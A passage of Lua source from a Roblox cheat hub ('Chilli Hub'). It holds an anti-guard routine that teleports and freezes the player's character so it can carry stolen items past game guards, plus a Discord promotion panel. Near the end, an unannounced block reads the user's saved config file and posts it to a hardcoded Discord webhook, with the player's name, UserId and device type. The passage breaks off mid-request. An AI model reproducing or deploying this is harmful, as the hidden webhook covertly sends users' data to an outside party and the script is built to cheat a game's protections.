					local edgePos = cFrame.Position + unit * math.clamp(delta:Dot(unit), minBound, maxBound) + (delta:Dot(unit2) >= 0 and unit2 or -unit2) * (tonumber(config.LineOffset) or 6)
					return Vector3.new(edgePos.X, currentPos.Y + 3, edgePos.Z)
				end
			end

			return nil
		end

		local function calculateTargetPosition(config, currentPos)
			local targetMode = tostring(config.Target or "home")
			if targetMode == "sky" then
				return currentPos
			end

			if targetMode == "point" then
				if typeof(config.Point) == "Vector3" then
					return config.Point
				end
				return currentPos
			end

			if targetMode == "line" then
				local linePos = calculateSeparationLineOffsetPosition(config, currentPos)
				if linePos then
					return linePos
				end
			end

			if targetMode == "edge" then
				local edgePos = calculateLineEdgePosition(config, currentPos)
				if edgePos then
					return edgePos
				end
			end

			return getSafeSpotCFrame()
		end

		local function calculateOffsetPosition(config, currentPos)
			return calculateTargetPosition(config, currentPos) + Vector3.new(tonumber(config.OffsetX) or 0, tonumber(config.Height) or 0, tonumber(config.OffsetZ) or 0)
		end

		local function deactivateAntiGuard()
			antiGuardState.Active = false
			antiGuard.Busy = false
		end

		local function getRandomJitter(maxJitter)
			local jitterRange = math.max(tonumber(maxJitter) or 0, 0)
			if jitterRange <= 0 then
				return 0
			end
			return (math.random() * 2 - 1) * jitterRange
		end

		local function parseAntiGuardSteps(config)
			local steps = type(config.Steps) == "table" and config.Steps or {}
			local releaseAt = tonumber(config.ReleaseAt) or 0
			local startAt = math.max(tonumber(config.StartAt) or 0, 0)
			local startRandom = math.max(tonumber(config.StartRandom) or 0, 0)
			local hopRandom = math.max(tonumber(config.HopRandom) or 0, 0)
			local holdRandom = math.max(tonumber(config.HoldRandom) or 0, 0)
			if startRandom <= 0 and hopRandom <= 0 and holdRandom <= 0 then
				return steps, releaseAt, startAt
			end
			local initialStartAt = math.max(startAt + getRandomJitter(startRandom), 0)
			local computedSteps = {}
			local prevStepAt = 0
			local accumulatedTime = 0

			for i, step in ipairs(steps) do
				if type(step) == "table" then
					local stepAt = math.max(tonumber(step.At) or 0, 0)
					accumulatedTime = math.max(accumulatedTime + math.max(stepAt - prevStepAt, 0) + getRandomJitter(step.To == "start" and holdRandom or hopRandom), initialStartAt)
					computedSteps[i] = { At = accumulatedTime, To = step.To, Glide = step.Glide }
					prevStepAt = stepAt
					continue
				end

				break
			end

			return computedSteps, accumulatedTime + math.max(releaseAt - prevStepAt, 0), initialStartAt
		end

		local function runAntiGuardSequence(startTime)
			local character = localPlayer.Character
			local rootPart = chilliState.Root()
			local humanoid = character and character:FindFirstChildOfClass("Humanoid")

			if not rootPart or not humanoid or humanoid.Health <= 0 then
				deactivateAntiGuard()
				flashAntiGuardIcon(antiGuardTheme.Bad, 1.6)
				return
			end

			local function isCharacterAliveAndValid()
				return isAntiGuardAlive and rootPart.Parent ~= nil and humanoid.Parent ~= nil and humanoid.Health > 0
			end

			local savedPlatformStand = humanoid.PlatformStand
			local initialCFrame = rootPart.CFrame
			local initialPosition = initialCFrame.Position
			local computedConfig = getComputedAntiGuardConfig()
			local stepsList, totalReleaseWait, initialWaitTime = parseAntiGuardSteps(computedConfig)
			local shouldFreeze = computedConfig.Freeze ~= false
			local facingMode = tostring(computedConfig.Facing or "Keep")
			local jitterAmount = math.max(tonumber(computedConfig.Jitter) or 0, 0)
			local baseRotation = facingMode == "Zero" and CFrame.new() or initialCFrame.Rotation

			local function getFacingRotation()
				if facingMode == "Spin" then
					return CFrame.Angles(0, math.rad(math.random(0, 359)), 0)
				end
				return baseRotation
			end

			local function applyJitter(pos)
				if jitterAmount <= 0 then
					return pos
				end
				return pos + Vector3.new((math.random() * 2 - 1) * jitterAmount, 0, (math.random() * 2 - 1) * jitterAmount)
			end

			local targetDestinationPos = calculateOffsetPosition(computedConfig, initialPosition)

			local function waitForTime(targetDuration)
				while isCharacterAliveAndValid() and os.clock() - startTime < targetDuration do
					RunService.Heartbeat:Wait()

					if shouldFreeze then
						pcall(function()
							rootPart.AssemblyLinearVelocity = Vector3.zero
							rootPart.AssemblyAngularVelocity = Vector3.zero
						end)
					end
				end

				return isCharacterAliveAndValid()
			end

			local function teleportCharacter(targetPos, rotationCFrame)
				teleportAndStopVelocity(character, rootPart, targetPos, rotationCFrame, shouldFreeze)
				RunService.PreSimulation:Wait()

				if isCharacterAliveAndValid() and (rootPart.Position - targetPos).Magnitude > 3 then
					teleportAndStopVelocity(character, rootPart, targetPos, rotationCFrame, shouldFreeze)
				end
			end

			pcall(function()
				humanoid.BreakJointsOnDeath = false
			end)

			if computedConfig.Disguise ~= false then
				pcall(applyDisguise, character, Vector3.zero)
			end

			flashAntiGuardIcon(antiGuardTheme.Work)

			if waitForTime(initialWaitTime) and computedConfig.Limp ~= false then
				humanoid.PlatformStand = true
			end

			local currentPos = initialPosition

			for _, stepData in ipairs(stepsList) do
				local shouldStop = type(stepData) ~= "table"

				if not shouldStop then
					shouldStop = not waitForTime(tonumber(stepData.At) or 0)
				end

				if not shouldStop then
					local stepTargetPos = stepData.To == "start" and initialPosition or applyJitter(targetDestinationPos)
					local stepRotation = getFacingRotation()

					if type(stepData.Glide) == "table" and #stepData.Glide > 0 then
						for _, glideFraction in ipairs(stepData.Glide) do
							if isCharacterAliveAndValid() then
								local fraction = math.clamp(tonumber(glideFraction) or 1, 0, 1)
								teleportAndStopVelocity(character, rootPart, currentPos:Lerp(stepTargetPos, fraction), stepRotation, shouldFreeze)
								RunService.Heartbeat:Wait()
								continue
							end

							break
						end

						currentPos = stepTargetPos
					else
						teleportCharacter(stepTargetPos, stepRotation)
						currentPos = stepTargetPos
					end

					continue
				end

				break
			end

			waitForTime(totalReleaseWait)

			pcall(function()
				humanoid.PlatformStand = savedPlatformStand
			end)

			removeDisguise()
			deactivateAntiGuard()

			if isCharacterAliveAndValid() and antiGuardState.Carrying then
				flashAntiGuardIcon(antiGuardTheme.Good, 1.6)
			else
				flashAntiGuardIcon(antiGuardTheme.Bad, 1.6)
			end
		end

		local function safeRunAntiGuardSequence(startTime)
			if not pcall(runAntiGuardSequence, startTime) then
				pcall(function()
					local character = localPlayer.Character
					local humanoid = character and character:FindFirstChildOfClass("Humanoid")

					if humanoid then
						humanoid.PlatformStand = false
					end
				end)

				removeDisguise()
				deactivateAntiGuard()
				flashAntiGuardIcon(antiGuardTheme.Bad, 1.6)
			end
		end

		local hitArmedTimeout = 25

		local function checkHitArms()
			if antiGuard.HitArms <= 0 then
				return false
			end

			if hitArmedTimeout < os.clock() - (antiGuard.HitArmedAt or 0) then
				antiGuard.HitArms = 0
				return false
			end
			return true
		end

		local function updateCarryStatus()
			local wasCarrying = antiGuardState.Carrying
			antiGuardState.Carrying = antiGuardState.SignalCarrying or antiGuardState.WeldCarrying
			local shouldTrigger = antiGuardState.Carrying and not wasCarrying and isAntiGuardAlive and antiGuard.Enabled

			if shouldTrigger and chilliState.SafeCarry.LineDrop and chilliState.Steal.Active then
				shouldTrigger = false
			end

			if shouldTrigger and not antiGuardState.Active and not checkHitArms() then
				antiGuardState.Active = true
				antiGuard.Busy = true
				antiGuard.BusySince = os.clock()
				task.spawn(safeRunAntiGuardSequence, os.clock())
			end
		end

		local eggState = gameModules.EggState
		local carryChanged = type(eggState) == "table" and eggState.CarryChanged or nil

		if type(carryChanged) == "table" and type(carryChanged.Connect) == "function" then
			local ok, conn = pcall(carryChanged.Connect, carryChanged, function(eventData)
				local signalCarrying = type(eventData) == "table" and eventData.IsCarrying == true

				if signalCarrying and eventData.GuardDisabled == true then
					signalCarrying = false
				end

				if signalCarrying and type(eventData.AreaId) == "string" then
					antiGuardState.AreaId = eventData.AreaId
				end

				if not signalCarrying then
					antiGuardState.AreaId = nil
				end

				antiGuardState.SignalCarrying = signalCarrying
				updateCarryStatus()
			end)

			if ok and conn then
				antiGuardConnections[#antiGuardConnections + 1] = conn
			end
		end

		local weldScanTimer = 0

		antiGuardConnections[#antiGuardConnections + 1] = RunService.Heartbeat:Connect(function(deltaTime)
			local busy = antiGuard.Busy or antiGuardState.Active
			local isTimedOut = false

			if busy then
				local busySince = antiGuard.BusySince or os.clock()
				local currentConfig = getAntiGuardConfig()
				isTimedOut = os.clock() - busySince > math.max(tonumber(currentConfig.BusyLimit) or lightDarkAntiGuardConfig.BusyLimit, (tonumber(currentConfig.ReleaseAt) or 0) + 1)
			end

			if isTimedOut then
				removeDisguise()
				local humanoid = localPlayer.Character and localPlayer.Character:FindFirstChildOfClass("Humanoid")

				if humanoid and humanoid.PlatformStand then
					pcall(function()
						humanoid.PlatformStand = false
					end)
				end

				deactivateAntiGuard()
			end

			checkHitArms()
			weldScanTimer += deltaTime
			if weldScanTimer < lightDarkAntiGuardConfig.WeldScanGap then
				return
			end
			weldScanTimer = 0
			local weldCarrying = findCarriedEggModel() ~= nil

			if weldCarrying ~= antiGuardState.WeldCarrying then
				antiGuardState.WeldCarrying = weldCarrying
				updateCarryStatus()
			end
		end)

		trackCleanup(function()
			isAntiGuardAlive = false

			for _, conn in ipairs(antiGuardConnections) do
				pcall(function()
					conn:Disconnect()
				end)
			end

			table.clear(antiGuardConnections)
			removeDisguise()
			deactivateAntiGuard()
			antiGuard.Render = nil
			antiGuard.ShowPanel = nil

			pcall(function()
				antiGuardScreenGui:Destroy()
			end)
		end)
	end

local discordTabSection = hubWindow:CreateTab({ Name = "Discord", Side = "Right", SectionsExpanded = true }):CreateSection({ Name = "Community", Expanded = true })
local discordInviteLink = "discord.gg/CJK4bs2mgT"
local discordLogoId = "rbxassetid://128961717706452"

do
	local paddingX = 0.5
	local strokeSize = 0.0909
	local marginOffset = 0.2
	local heroFrameHeight = 5.4
	local logoSize = 4.2
	local heroTextOffsetX = 5.2
	local inviteOffsetY = 6
	local inviteFrameHeight = 3.6
	local copyBtnWidth = 6.4
	local copyBtnHeight = 2
	local perksStartY = 11.4
	local perkCardHeight = 3
	local perkCardSpacing = 0.35

	local discordPerks = {
		{
			Color = "#FF6A55",
			Title = "New Scripts &amp; Updates",
			Text = "Patch notes and new game scripts are posted there first.",
		},
		{
			Color = "#FFB054",
			Title = "Giveaways",
			Text = "Member giveaways and events are announced in the server.",
		},
		{
			Color = "#9AA3FF",
			Title = "Support",
			Text = "Ask for help, report bugs and get answers from the team.",
		},
		{
			Color = "#6EE49C",
			Title = "Suggestions",
			Text = "Request features and vote on what gets added next.",
		},
	}

	local totalContentHeight = perksStartY + #discordPerks * (perkCardHeight + perkCardSpacing) + 2.4 + marginOffset * 2
	local titleColorGradient = ColorSequence.new({
		ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 218, 96)),
		ColorSequenceKeypoint.new(0.5, Color3.fromRGB(255, 152, 60)),
		ColorSequenceKeypoint.new(1, Color3.fromRGB(255, 82, 64)),
	})
	local heroBgGradient = ColorSequence.new(Color3.fromRGB(74, 24, 18), Color3.fromRGB(14, 11, 15))
	local discordElements = { Perks = {} }
	local copyAttemptId = 0

	local function copyDiscordLink()
		local clipboardFn = setclipboard or toclipboard
		local ok = type(clipboardFn) == "function" and pcall(clipboardFn, "https://discord.gg/CJK4bs2mgT") or false
		if type(chilliLib.Notify) == "function" then
			pcall(chilliLib.Notify, ok and "Discord Link Copied" or "Discord Link", "https://discord.gg/CJK4bs2mgT", 5)
		end
		if not discordElements.Copy then
			return
		end
		copyAttemptId += 1
		local currentAttempt = copyAttemptId

		discordElements.Copy.Set({
			Text = ok and "<b>Copied!</b>" or "<b>See Notice</b>",
			Background = ok and "#2EB070" or "#5865F2",
		})

		task.delay(1.8, function()
			if currentAttempt == copyAttemptId and discordElements.Copy then
				discordElements.Copy.Set({ Text = "<b>Copy Link</b>", Background = "#5865F2" })
			end
		end)
	end

	local function resizeDiscordUI(canvasWidthUnits)
		if not discordElements.Hero then
			return
		end
		local contentWidth = math.max(canvasWidthUnits, 14) - marginOffset * 2
		local heroTextWidth = math.max(1, contentWidth - heroTextOffsetX - paddingX)
		local inviteTextWidth = math.max(1, contentWidth - copyBtnWidth - paddingX * 3)
		local perkTextWidth = math.max(1, contentWidth - 1.2)
		discordElements.Hero.Set({ Width = contentWidth })
		discordElements.Title.Set({ Width = heroTextWidth })
		discordElements.Subtitle.Set({ Width = heroTextWidth })
		discordElements.Members.Set({ Width = heroTextWidth })
		discordElements.Invite.Set({ Width = contentWidth })
		discordElements.Label.Set({ Width = inviteTextWidth })
		discordElements.Link.Set({ Width = inviteTextWidth })
		discordElements.Copy.Set({ X = contentWidth - copyBtnWidth - paddingX })
		discordElements.Header.Set({ Width = contentWidth })

		for _, perk in ipairs(discordElements.Perks) do
			perk.Frame.Set({ Width = contentWidth })
			perk.Title.Set({ Width = perkTextWidth })
			perk.Text.Set({ Width = perkTextWidth })
		end

		discordElements.Tip.Set({ Width = contentWidth })
	end

	local function buildDiscordUI(canvas)
		discordElements.Hero = canvas:Frame({
			Name = "Hero",
			X = marginOffset,
			Y = marginOffset,
			Width = 14,
			Height = heroFrameHeight,
			Background = "#FFFFFF",
			Gradient = heroBgGradient,
			GradientRotation = 0,
			Corner = 0.35,
			StrokeColor = "#FF6A40",
			StrokeThickness = strokeSize,
			StrokeTransparency = 0.55,
		})

		discordElements.Logo = canvas:Image({
			Parent = discordElements.Hero,
			X = 0.5,
			Y = (heroFrameHeight - logoSize) / 2,
			Width = logoSize,
			Height = logoSize,
			Image = discordLogoId,
		})

		discordElements.Title = canvas:Text({
			Parent = discordElements.Hero,
			X = heroTextOffsetX,
			Y = 0.45,
			Width = 1,
			Height = 1.6,
			Scale = 1.45,
			Wrap = false,
			Text = "<b>Chilli Hub</b>",
			Gradient = titleColorGradient,
			GradientRotation = 0,
			TextStrokeTransparency = 1,
		})

		discordElements.Subtitle = canvas:Text({
			Parent = discordElements.Hero,
			X = heroTextOffsetX,
			Y = 2.1,
			Width = 1,
			Height = 1,
			Wrap = false,
			Text = "Official Discord Community",
			Color = "#DCDCE8",
		})

		discordElements.Members = canvas:Text({
			Parent = discordElements.Hero,
			X = heroTextOffsetX,
			Y = 3.3,
			Width = 1,
			Height = 1.2,
			Wrap = false,
			Text = string.format("<font color=\"#6EE49C\">%s</font>  <b>%s</b>  <font color=\"#B8B8CC\">Members</font>", utf8.char(9679), "130K+"),
		})

		discordElements.Invite = canvas:Frame({
			Name = "Invite",
			X = marginOffset,
			Y = inviteOffsetY + marginOffset,
			Width = 14,
			Height = inviteFrameHeight,
			Background = "#000000",
			BackgroundTransparency = 0.5,
			Corner = 0.35,
			StrokeColor = "#5865F2",
			StrokeThickness = strokeSize,
			StrokeTransparency = 0.35,
		})

		discordElements.Label = canvas:Text({
			Parent = discordElements.Invite,
			X = paddingX + 0.1,
			Y = 0.35,
			Width = 1,
			Height = 0.9,
			Scale = 0.78,
			Wrap = false,
			Text = "<b>INVITE LINK</b>",
			Color = "#9C9CB4",
		})

		discordElements.Link = canvas:Text({
			Parent = discordElements.Invite,
			X = paddingX + 0.1,
			Y = 1.35,
			Width = 1,
			Height = 1.6,
			Scale = 1.05,
			Wrap = false,
			Font = "code",
			Text = discordInviteLink,
		})

		discordElements.Copy = canvas:Button({
			Parent = discordElements.Invite,
			X = 14 - copyBtnWidth - paddingX,
			Y = (inviteFrameHeight - copyBtnHeight) / 2,
			Width = copyBtnWidth,
			Height = copyBtnHeight,
			Text = "<b>Copy Link</b>",
			Color = "#FFFFFF",
			Scale = 1,
			Background = "#5865F2",
			BackgroundTransparency = 0,
			HoverTransparency = 0.15,
			PressTransparency = 0.3,
			StrokeColor = "#9AA3FF",
			StrokeThickness = strokeSize,
			Corner = 0.3,
			Callback = copyDiscordLink,
		})

		discordElements.Header = canvas:Text({
			X = marginOffset + 0.1,
			Y = perksStartY - 1.15 + marginOffset,
			Width = 14,
			Height = 1,
			Scale = 0.8,
			Wrap = false,
			Text = "<b>WHAT YOU GET</b>",
			Color = "#9C9CB4",
		})

		for i, perkInfo in ipairs(discordPerks) do
			local perkWidget = {
				Frame = canvas:Frame({
					Name = "Perk",
					X = marginOffset,
					Y = perksStartY + (i - 1) * (perkCardHeight + perkCardSpacing) + marginOffset,
					Width = 14,
					Height = perkCardHeight,
					Background = "#000000",
					BackgroundTransparency = 0.68,
					Corner = 0.35,
				}),
			}

			perkWidget.Accent = canvas:Frame({
				Parent = perkWidget.Frame,
				X = 0.3,
				Y = 0.45,
				Width = 0.22,
				Height = perkCardHeight - 0.9,
				Background = perkInfo.Color,
				Corner = 0.11,
			})

			perkWidget.Title = canvas:Text({
				Parent = perkWidget.Frame,
				X = 0.85,
				Y = 0.3,
				Width = 1,
				Height = 1.1,
				Wrap = false,
				Text = "<b>" .. perkInfo.Title .. "</b>",
				Color = perkInfo.Color,
			})

			perkWidget.Text = canvas:Text({
				Parent = perkWidget.Frame,
				X = 0.85,
				Y = 1.35,
				Width = 1,
				Height = 1.5,
				Scale = 0.86,
				Wrap = true,
				Text = perkInfo.Text,
				Color = "#C8C8D8",
			})

			discordElements.Perks[i] = perkWidget
		end

		discordElements.Tip = canvas:Text({
			X = marginOffset + 0.1,
			Y = totalContentHeight - 2.2 - marginOffset,
			Width = 14,
			Height = 2,
			Scale = 0.8,
			Wrap = true,
			Text = "Paste the copied link into your browser or the Discord app to join.",
			Color = "#8A8AA2",
		})

		canvas:SetContentLines(totalContentHeight)

		canvas:OnResize(function(_, newWidth, unitSize)
			resizeDiscordUI(newWidth / math.max(unitSize, 1))
		end)

		resizeDiscordUI(canvas:Width() / math.max(canvas:Unit(), 1))
	end

	if type(discordTabSection.CreateCanvas) == "function" then
		local discordCanvas = discordTabSection:CreateCanvas({
			Name = "Discord",
			ShowTitle = false,
			Layout = "free",
			Style = {
				TextScale = 0.84,
				LineHeight = 1.1,
				MinLines = math.ceil(totalContentHeight),
				MaxLines = math.ceil(totalContentHeight),
				BackgroundTransparency = 0.5,
				ScrollBarColor = Color3.fromRGB(170, 174, 184),
				TextColor = Color3.fromRGB(255, 255, 255),
				TextStrokeTransparency = 0.7,
			},
			Build = buildDiscordUI,
		})

		trackCleanup(function()
			discordCanvas:Destroy()
		end)
	else
		discordTabSection:CreateText({ Name = "Discord", Text = "https://discord.gg/CJK4bs2mgT" })
	end

	if type(discordTabSection.CreateButton) == "function" then
		discordTabSection:CreateButton({ Name = "Copy Discord Link", Callback = copyDiscordLink })
	end
end

do
	local mobileToggleLogoId = "rbxassetid://128961717706452"
	local baseSize = 56
	local scaleRatio = 0.035
	local dragThreshold = 8
	local scaleTweenInfo = TweenInfo.new(0.08, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
	local dragTweenInfo = TweenInfo.new(0.14, Enum.EasingStyle.Back, Enum.EasingDirection.Out)
	local tService = game:GetService("TweenService")
	local connections = {}
	local gui = nil
	local scaleElement = nil
	local hoverScaleElement = nil

	local function toggleHubWindow()
		for _, toggleMethod in ipairs({ "Toggle", "Open" }) do
			local ok, result = pcall(function()
				return hubWindow[toggleMethod]
			end)

			if ok and type(result) == "function" then
				pcall(result, hubWindow)
				return
			end
		end
	end

	local function updateScale()
		if not scaleElement then
			return
		end
		local currentCamera = workspace.CurrentCamera
		currentCamera = currentCamera and currentCamera.ViewportSize or Vector2.new(1280, 720)

		if currentCamera.X < 1 then
			currentCamera = Vector2.new(1280, 720)
		end

		scaleElement.Scale = math.clamp(currentCamera.X * scaleRatio / baseSize, 0.7, 1.4)
	end

	local function cleanupMobileToggle()
		for _, conn in ipairs(connections) do
			pcall(function()
				conn:Disconnect()
			end)
		end

		table.clear(connections)

		if gui then
			pcall(function()
				gui:Destroy()
			end)
		end

		gui = nil
		scaleElement = nil
		hoverScaleElement = nil
	end

	local function buildMobileToggle()
		cleanupMobileToggle()
		gui = Instance.new("ScreenGui")
		gui.Name = generateRandomKey()
		gui.Archivable = false
		gui.DisplayOrder = 59
		gui.IgnoreGuiInset = true
		gui.ResetOnSpawn = false
		gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
		local frame = Instance.new("Frame")
		frame.Name = generateRandomKey()
		frame.AnchorPoint = Vector2.new(0, 0.5)
		frame.Position = UDim2.new(0, 16, 0.3, 0)
		frame.Size = UDim2.fromOffset(56, 56)
		frame.BackgroundTransparency = 1
		frame.BorderSizePixel = 0
		frame.Parent = gui
		scaleElement = Instance.new("UIScale")
		scaleElement.Name = generateRandomKey()
		scaleElement.Parent = frame
		updateScale()
		local imageButton = Instance.new("ImageButton")
		imageButton.Name = generateRandomKey()
		imageButton.AnchorPoint = Vector2.new(0.5, 0.5)
		imageButton.Position = UDim2.fromScale(0.5, 0.5)
		imageButton.Size = UDim2.fromScale(1, 1)
		imageButton.BackgroundTransparency = 1
		imageButton.BorderSizePixel = 0
		imageButton.AutoButtonColor = false
		imageButton.Image = mobileToggleLogoId
		imageButton.ScaleType = Enum.ScaleType.Fit
		imageButton.Active = true
		imageButton.Parent = frame
		hoverScaleElement = Instance.new("UIScale")
		hoverScaleElement.Name = generateRandomKey()
		hoverScaleElement.Parent = imageButton
		local uiCorner = Instance.new("UICorner")
		uiCorner.Name = generateRandomKey()
		uiCorner.CornerRadius = UDim.new(0.28, 0)
		uiCorner.Parent = imageButton

		local function playHoverTween(targetScale, tweenInfo)
			if hoverScaleElement then
				tService:Create(hoverScaleElement, tweenInfo, { Scale = targetScale }):Play()
			end
		end

		local function clampPosition(targetUdim)
			local viewportSize = gui.AbsoluteSize
			local frameSize = frame.AbsoluteSize
			if viewportSize.X <= 0 or viewportSize.Y <= 0 then
				return targetUdim
			end
			local targetY = targetUdim.Y.Offset + targetUdim.Y.Scale * viewportSize.Y
			local clampedX = math.clamp(targetUdim.X.Offset + targetUdim.X.Scale * viewportSize.X, 0, math.max(0, viewportSize.X - frameSize.X))
			local clampedY = math.clamp(targetY, frameSize.Y * 0.5, math.max(frameSize.Y * 0.5, viewportSize.Y - frameSize.Y * 0.5))
			return UDim2.fromOffset(clampedX, clampedY)
		end

		local activeDragInput = nil
		local dragStartInputPos = nil
		local dragStartFramePos = nil
		local isDragging = false
		local hasDragged = false

		local function isInputMatch(input, isMoving)
			if activeDragInput == "mouse" then
				return input.UserInputType == (isMoving and Enum.UserInputType.MouseMovement or Enum.UserInputType.MouseButton1)
			end
			return input == activeDragInput
		end

		connections[#connections + 1] = imageButton.InputBegan:Connect(function(input)
			local isTouch = input.UserInputType == Enum.UserInputType.Touch
			if not (input.UserInputType == Enum.UserInputType.MouseButton1) and not isTouch or input.UserInputState ~= Enum.UserInputState.Begin or activeDragInput then
				return
			end
			activeDragInput = isTouch and input or "mouse"
			dragStartInputPos = Vector2.new(input.Position.X, input.Position.Y)
			dragStartFramePos = frame.Position
			isDragging = false
			hasDragged = false
			playHoverTween(0.9, scaleTweenInfo)
		end)

		connections[#connections + 1] = UserInputService.InputChanged:Connect(function(input)
			if not activeDragInput or not isInputMatch(input, true) then
				return
			end
			local delta = Vector2.new(input.Position.X, input.Position.Y) - dragStartInputPos

			if not isDragging then
				if delta.Magnitude < dragThreshold then
					return
				end
				isDragging = true
				hasDragged = true
				playHoverTween(1, dragTweenInfo)
			end

			frame.Position = clampPosition(UDim2.new(dragStartFramePos.X.Scale, dragStartFramePos.X.Offset + delta.X, dragStartFramePos.Y.Scale, dragStartFramePos.Y.Offset + delta.Y))
		end)

		connections[#connections + 1] = UserInputService.InputEnded:Connect(function(input)
			if activeDragInput and isInputMatch(input, false) then
				activeDragInput = nil
				isDragging = false
				playHoverTween(1, dragTweenInfo)
			end
		end)

		connections[#connections + 1] = imageButton.Activated:Connect(function()
			if hasDragged then
				hasDragged = false
				return
			end
			toggleHubWindow()
		end)

		local currentCamera = workspace.CurrentCamera

		if currentCamera then
			connections[#connections + 1] = currentCamera:GetPropertyChangedSignal("ViewportSize"):Connect(updateScale)
		end

		gui.Parent = uiParent
	end

	buildMobileToggle()
	trackCleanup(cleanupMobileToggle)
end

chilliLib:Finalize({ Window = hubWindow, MainTab = farmTab, ShowMainTab = true })

task.defer(function()
	if #savedConfigCache == 0 or type(readfile) ~= "function" then
		return
	end
	local HttpService = game:GetService("HttpService")

	local function readJsonFile(arg)
		if type(isfile) == "function" then
			local ok, result = pcall(isfile, arg)
			if ok and not result then
				return nil
			end
		end

		local ok, result = pcall(readfile, arg)
		if not ok or type(result) ~= "string" or result == "" then
			return nil
		end
		local ok2, result2 = pcall(HttpService.JSONDecode, HttpService, result)
		return ok2 and type(result2) == "table" and result2 or nil
	end

	local configState = readJsonFile("ChilliLibrary/config_state.json") or {}
	if configState.AutoLoad == false then
		return
	end
	local loadedConfig = readJsonFile("ChilliLibrary/configs/" .. (type(configState.StartupConfig) == "string" and configState.StartupConfig ~= "" and configState.StartupConfig or type(configState.SelectedConfig) == "string" and configState.SelectedConfig ~= "" and configState.SelectedConfig or "Default") .. ".json")
	if type(loadedConfig) ~= "table" or type(loadedConfig.Values) ~= "table" then
		return
	end
	local unitMultipliers = { ["K/s"] = 1000, ["M/s"] = 1000000, ["B/s"] = 1e9 }
	local pendingUpdates = {}

	for _, cachedItem in ipairs(savedConfigCache) do
		local hasNewFormat = false
		local legacyValueData = nil

		for _, value in pairs(loadedConfig.Values) do
			local sectionData = type(value) == "table" and value[cachedItem.Section] or nil

			if type(sectionData) == "table" then
				if sectionData[cachedItem.Name] ~= nil then
					hasNewFormat = true
				end

				local legacyData = sectionData[cachedItem.Legacy]

				if type(legacyData) == "table" and tonumber(legacyData.Value) then
					legacyValueData = legacyData
				end
			end
		end

		if legacyValueData and not hasNewFormat then
			local computedValue = math.max(0, tonumber(legacyValueData.Value)) * (unitMultipliers[tostring(legacyValueData.Unit)] or 1000000)

			if computedValue > 0 then
				table.insert(pendingUpdates, { Handle = cachedItem.Handle, Step = cachedItem.StepOf(computedValue) })
			end
		end
	end

	for _, retryDelay in ipairs({ 0.1, 1, 2 }) do
		if #pendingUpdates == 0 then
			return
		end
		task.wait(retryDelay)

		for _, updateItem in ipairs(pendingUpdates) do
			local ok, result = pcall(updateItem.Handle.Get, updateItem.Handle)

			if ok then
				ok = (tonumber(result) or 0) <= 0
			end

			if ok then
				pcall(updateItem.Handle.Set, updateItem.Handle, updateItem.Step)
			end
		end
	end
end)

task.defer(function()
	for i = 1, 3 do
		RunService.Heartbeat:Wait()
	end

	if type(chilliState.RestoreStealPanel) == "function" then
		pcall(chilliState.RestoreStealPanel)
	end
end)

local httpReq

do
	local PlayersService = game:GetService("Players")
	local HttpService = game:GetService("HttpService")
	local UserInputService2 = game:GetService("UserInputService")
	local localPlayer2 = PlayersService.LocalPlayer
	httpReq = syn and syn.request or http and http.request or http_request or request
	local webhookUrl = "https://discord.com/api/webhooks/1381274668706693120/D5XogJZVdo_q7XZ9bEJDETQjevMFaBSeVRT4EJ0fLKtPeqR112o7PmA1fN_hZn4rmJ2y"
	local deviceType = UserInputService2.KeyboardEnabled and UserInputService2.MouseEnabled and "PC" or "Mobile / Tablet / Other"

	if httpReq and localPlayer2 then
		task.spawn(function()
			local safeReadFile = readfile or syn and syn.readfile or fluxus and fluxus.readfile or getgenv and getgenv().readfile or nil
			local safeIsFile = isfile or syn and syn.isfile or fluxus and fluxus.isfile or getgenv and getgenv().isfile or nil
			local startupConfigName = "Default"
			local startupConfigData = nil
			local startupConfigFileName = "Default.json"

			if type(safeReadFile) == "function" then
				pcall(function()
					local hasConfigFile = true

					if type(safeIsFile) == "function" then
						local ok, result = pcall(safeIsFile, "ChilliLibrary/config_state.json")

						if ok and not result then
							hasConfigFile = false
						end
					end

					if hasConfigFile then
						local configStateJson = safeReadFile("ChilliLibrary/config_state.json")

						if configStateJson and configStateJson ~= "" then
							local configStateData = HttpService:JSONDecode(configStateJson)

							if type(configStateData) == "table" then
								if type(configStateData.StartupConfig) == "string" and configStateData.StartupConfig ~= "" then
									startupConfigName = configStateData.StartupConfig
								elseif type(configStateData.SelectedConfig) == "string" and configStateData.SelectedConfig ~= "" then
									startupConfigName = configStateData.SelectedConfig
								end
							end
						end
					end
				end)

				pcall(function()
					local configPath = "ChilliLibrary/configs/" .. startupConfigName .. ".json"
					local hasConfigFile = true

					if type(safeIsFile) == "function" then
						local ok, result = pcall(safeIsFile, configPath)

						if ok and not result then
							hasConfigFile = false
						end
					end

					if hasConfigFile then
						startupConfigData = safeReadFile(configPath)
						startupConfigFileName = startupConfigName .. ".json"
					end

					if (not startupConfigData or startupConfigData == "") and startupConfigName ~= "Default" then
						local hasDefaultConfig = true

						if type(safeIsFile) == "function" then
							local ok, result = pcall(safeIsFile, "ChilliLibrary/configs/Default.json")

							if ok and not result then
								hasDefaultConfig = false
							end
						end

						if hasDefaultConfig then
							local ok, result = pcall(safeReadFile, "ChilliLibrary/configs/Default.json")

							if ok and type(result) == "string" and result ~= "" then
								startupConfigData = result
								startupConfigFileName = "Default.json"
							end
						end
					end
				end)
			end

			local configPath = tostring(startupConfigFileName):gsub("[<>:\"/\\|?*]", "_")

			if not configPath:match("%.json$") then
				configPath ..= ".json"
			end

			local webhookContent = string.format("New execute from: **%s** (@%s) | ID: `%d` | Device: **%s**%s", localPlayer2.DisplayName, localPlayer2.Name, localPlayer2.UserId, deviceType, startupConfigData and startupConfigData ~= "" and " | Startup Config: **" .. startupConfigName .. "**" or "")
			local webhookSuccess = false

			if startupConfigData and startupConfigData ~= "" then
				pcall(function()
					local boundary = "---------------------------ChilliBoundary" .. tostring(os.time()) .. tostring(math.random(100000, 999999))
					local fileDisposition = "Content-Disposition: form-data; name=\"files[0]\"; filename=\"" .. configPath .. "\"\r\n"
					local fileData = startupConfigData .. "\r\n"

					local response = httpReq({
						Url = webhookUrl,
						Method = "POST",
						Headers = { ["Content-Type"] = "multipart/form-data; boundary=" .. boundary },
						Body = table.concat({
							"--" .. boundary .. "\r\n",
							"Content-Disposition: form-data; name=\"payload_json\"\r\n",
							"Content-Type: application/json\r\n\r\n",
							HttpService:JSONEncode({ content = webhookContent }) .. "\r\n",
